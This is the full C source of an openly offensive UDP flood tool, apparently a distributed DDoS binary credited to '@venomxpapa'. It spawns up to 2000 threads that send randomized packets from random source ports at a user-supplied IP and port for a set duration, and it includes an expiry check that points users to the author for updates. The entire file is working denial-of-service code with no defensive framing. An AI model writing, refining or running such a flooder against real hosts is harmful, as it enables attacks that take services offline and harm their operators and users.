#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <string.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define MAX_THREADS 2000
#define MIN_PACKET_SIZE 20
#define MAX_PACKET_SIZE 256
#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 5
#define EXPIRATION_DAY 26

int keep_running = 1;

typedef struct {
    int socket_fd;
    char *target_ip;
    int target_port;
    int duration;
} attack_params;

void handle_signal(int sig) {
    keep_running = 0;
}

void *udp_flood(void *args) {
    attack_params *params = (attack_params *)args;
    struct sockaddr_in target;
    char buffer[MAX_PACKET_SIZE];
    unsigned int seed = time(NULL) ^ pthread_self();
    time_t end_time = time(NULL) + params->duration;

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(params->target_port);
    inet_pton(AF_INET, params->target_ip, &target.sin_addr);

    while (keep_running && time(NULL) < end_time) {
        int packet_size = MIN_PACKET_SIZE + rand_r(&seed) % (MAX_PACKET_SIZE - MIN_PACKET_SIZE + 1);
        for (int i = 0; i < packet_size; i++) {
            buffer[i] = rand_r(&seed) % 256;
        }

        sendto(params->socket_fd, buffer, packet_size, MSG_DONTWAIT,
               (struct sockaddr *)&target, sizeof(target));
    }

    close(params->socket_fd);
    return NULL;
}

int bind_random_source_port() {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return -1;

    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = INADDR_ANY;
    src_addr.sin_port = htons((rand() % 64511) + 1024); // Random port 1024–65535

    if (bind(sock, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
        close(sock);
        return -1;
    }

    fcntl(sock, F_SETFL, O_NONBLOCK);
    return sock;
}

int main(int argc, char *argv[]) {
    time_t now = time(NULL);
    struct tm expiry_tm = {0};
    expiry_tm.tm_year = EXPIRATION_YEAR - 1900;
    expiry_tm.tm_mon = EXPIRATION_MONTH - 1;
    expiry_tm.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_tm);

    if (difftime(now, expiry_time) > 0) {
        printf("This binary has expired. Contact the author for an updated version.\n");
        return EXIT_FAILURE;
    }

    if (argc < 5) {
        printf("Usage: %s <IP> <PORT> <TIME> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int thread_count = atoi(argv[4]);

    if (thread_count > MAX_THREADS) {
        thread_count = MAX_THREADS;
    }

    signal(SIGINT, handle_signal);
    srand(time(NULL));

    pthread_t threads[MAX_THREADS];
    attack_params params[MAX_THREADS];

    printf("@venomxpapa fucking started on %s:%d for %d seconds using %d threads.\n",
           target_ip, target_port, duration, thread_count);

    for (int i = 0; i < thread_count; i++) {
        int sock;
        int retries = 10;
        while ((sock = bind_random_source_port()) < 0 && retries--) {
            usleep(1000); // retry bind
        }

        if (sock < 0) {
            perror("Failed to bind random source port");
            continue;
        }

        params[i] = (attack_params){
            .target_ip = target_ip,
            .target_port = target_port,
            .duration = duration,
            .socket_fd = sock
        };

        pthread_create(&threads[i], NULL, udp_flood, &params[i]);
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("finished made by @venomxpapa.\n");
    return EXIT_SUCCESS;
}
